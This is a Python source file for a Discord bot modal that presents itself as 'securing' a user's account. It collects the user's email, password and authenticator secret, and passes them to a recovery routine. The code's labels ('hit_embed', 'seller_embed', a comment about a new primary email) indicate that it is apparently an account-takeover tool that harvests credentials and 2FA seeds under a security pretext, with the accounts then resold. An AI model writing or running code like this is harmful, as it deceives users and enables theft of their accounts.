from discord import ui
import discord

from securing.recovery_secure import recovery_secure

class recoveryAuthModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Recovery Code Securing")
        self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
        self.add_item(ui.InputText(label="Password", placeholder="1234", required = True))
        self.add_item(ui.InputText(label="Authenticator Secret", placeholder="XXXXXXXXXXXXXXXX", required = True))

    async def callback(self, interaction: discord.Interaction):
        email = self.children[0].value
        password = self.children[1].value
        auth_secret = self.children[2].value

        await interaction.response.defer(ephemeral=True)

        await interaction.followup.send(
            embed=discord.Embed(
                title="Securing Account",
                description="Your account is being secured...",
                color=0x2765F5
            ),
            ephemeral=True
        )

        account = await recovery_secure(
            email = email, 
            method = "authpwd", 
            data = {
                "password": password, 
                "auth_secret": auth_secret
            }
        )

        if isinstance(account, dict) and account.get("failed"):
            fail_embed = account.get("hit_embed") or account.get("seller_embed")
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            try:
                await interaction.user.send(embed=fail_embed)
            except discord.Forbidden:
                await interaction.followup.send(
                    "Could not DM you — enable DMs from server members.",
                    ephemeral=True,
                )
            return

        if account == "invalid":
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Invalid Password / Secret\nMake sure you have 2FA Enabled!",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return
        
        if not account:
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Make sure your password and authenticator secret are correct and 2FA is enabled",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return
        
        # /secure admin: hit_embed has new primary (sunny@)
        await interaction.user.send(
            embed=account.get("hit_embed") or account["seller_embed"],
        )
    